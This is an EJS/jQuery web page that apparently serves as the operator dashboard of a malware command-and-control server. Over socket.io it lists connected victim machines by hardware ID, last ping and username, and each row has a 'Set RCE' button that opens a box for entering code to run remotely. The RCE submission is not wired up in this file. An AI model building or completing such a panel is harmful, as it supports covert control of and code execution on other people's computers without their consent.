<!DOCTYPE html>
<html lang="en">
    <%- include("includes/head.ejs") %>
    <body>
        <div class="container-fluid h-100">
            <%- include("includes/navbar.ejs") %>
            <div class="d-flex align-items-center justify-content-center h-100">
                <div class="d-flex flex-column" style="width: 35%">
                    <h1 class="text align-self-center">Clients</h1>
                    <p class="text align-self-center" style="padding-bottom:25px;color:rgb(180, 180, 180);">View and manage clients.</p>
                    <table id="clientTable" class="table justify-content-center align-items-center text-center" id="clientTable">
                        <thead>
                            <tr>
                                <th scope="col">HWID</th>
                                <th scope="col">Last Pinged</th>
                                <th scope="col">Last Username</th>
                                <th scope="col">Set RCE</th>
                            </tr>
                        </thead>
                        <tbody id="clientTableBody">
                        </tbody>
                    </table>
                    <!-- Modal -->
                    <div class="modal fade" id="rceModal" tabindex="-1" role="dialog" aria-labelledby="rceModalLabel" aria-hidden="true">
                      <div class="modal-dialog" role="document">
                        <div class="modal-content">
                          <div class="modal-header">
                            <h5 class="modal-title" id="rceModalLabel">Set RCE</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                              <span aria-hidden="true">&times;</span>
                            </button>
                          </div>
                          <div class="modal-body">
                            <textarea class="form-input">
                              
                            </textarea>
                          </div>
                          <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                            <button type="button" class="btn btn-primary">Save changes</button>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
            </div>
        </div>

        <%- include("includes/scripts.ejs") %>
        <script type="text/javascript">
          let lastPings = {};

          const getWhenPinged = (hwid) => {
              return parseInt((Date.now() - lastPings[hwid]) / 1000);
          }

          const updateTimes = () => {
              $('#clientTableBody').children('tr').children('td').each(function(idx) {
                  if ($(this).attr('class') == 'lastPingText') {
                      const associatedHWIDText = $(this).prev('td');
                      const realHWID = associatedHWIDText.attr('realHWID');
                      const secondsAgo = getWhenPinged(realHWID);

                      $(this).text(secondsAgo > 60 ? '>60 seconds ago' : secondsAgo + ' seconds ago');
                  }
              });
          }

          const addClient = (hwid) => {
              const row = $('<tr>');
              const hwidElement = $('<td>').addClass('hwidText').attr('data-toggle', 'tooltip').attr('title', hwid).attr('realHWID', hwid);
              const a = $('<a>').attr('href', `/clients/${hwid}`).text(hwid.slice(0, 20) + '...');
              hwidElement.append(a);
              
              row.append(hwidElement);
              row.append($('<td>').text(getWhenPinged(hwid) + ' seconds ago').addClass('lastPingText'));
              
              $('#clientTableBody').append(row);
          }

          $(document).ready(function() {
              const socket = io();

              socket.on('connect', () => {
                  socket.emit('requestClients');
              });

              socket.on('receiveClients', (clients) => {
                  $('#clientTableBody tr').remove(); // just incase

                  Object.keys(clients).forEach(hwid => {
                      lastPings[hwid] = clients[hwid];
                      addClient(hwid);
                  });
              });

              socket.on('clientPinged', hwid => {
                  lastPings[hwid] = Date.now();
                  updateTimes();
              });

              socket.on('clientAdded', hwid => {
                  lastPings[hwid] = Date.now();
                  addClient(hwid);
                  socket.emit('getClientLastName', hwid);  
              });

              socket.on('clientRemoved', hwid => {
                  delete lastPings[hwid];
                  
                  $('#clientTableBody').children('tr').children('td').each(function(idx) {
                    if ($(this).attr('class') == 'lastPingText') {
                        const associatedHWIDText = $(this).prev('td');
                        const realHWID = associatedHWIDText.attr('realHWID');
                        
                        if (realHWID == hwid) $(this).parent('tr').remove();
                    }
                  });
              });

              socket.on('receiveClientLastName', (hwid, name) => {
                  $('#clientTableBody').children('tr').children('td').each(function(idx) {
                      if ($(this).attr('class') == 'lastPingText') {
                          const associatedHWIDText = $(this).prev('td');
                          const realHWID = associatedHWIDText.attr('realHWID');
                          
                          if (realHWID == hwid) {
                              $(this).parent('tr').append($('<td>').text(name));
                              $(this).parent('tr').append($('<td>').append($('<button>').addClass('btn').addClass('btn-sm').addClass('btn-secondary').addClass('set-rce-button').attr('hwid', hwid).text('Click Here')));
                          }
                      }
                  });
              });

              $('body').delegate('.set-rce-button', 'click', function() {
                  console.log($(this).attr('hwid'));
                  $('#rceModal').modal();
              });

              $("body").tooltip({ selector: '[data-toggle=tooltip]' });

              setInterval(updateTimes, 1000);
          });
      </script>
    </body>
</html>
